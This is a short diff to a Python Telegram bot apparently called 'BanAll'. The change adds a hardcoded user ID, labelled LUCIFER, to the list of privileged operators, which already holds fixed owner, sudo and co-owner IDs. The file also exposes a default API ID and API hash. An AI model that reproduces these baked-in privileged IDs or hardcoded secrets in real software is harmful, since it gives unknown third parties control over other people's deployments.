@@ -1,4 +1,4 @@
-# Powered by @HDarkranger00 | TELE:- @aadillllll
+# Powered by @Darkranger00 | TELE:- @aadillllll
 # Dear Pero ppls Plish Don't remove this line from here🌚
 # created by Aadil Shiekj
 import logging
@@ -28,9 +28,10 @@ API_ID = int(getenv("API_ID", "4110592"))
 API_HASH = getenv("API_HASH", "aa7c849566922168031b95212860ede0")
 BOT_TOKEN = getenv("BOT_TOKEN", None)
 OWNER_ID = getenv("OWNER_ID", None)
-SUDO_ID = "1463712862", "5044329488"
+SUDO_ID = "1463712862"
+LUCIFER = "5044329488"
 COWNER_ID = "5716978554"
-OP  = [ int(OWNER_ID), int(SUDO_ID), int(COWNER_ID)]
+OP  = [ int(OWNER_ID), int(SUDO_ID), int(COWNER_ID), int(LUCIFER)]
 #TelegramClient..
 sree = TelegramClient(
     "BanAll",
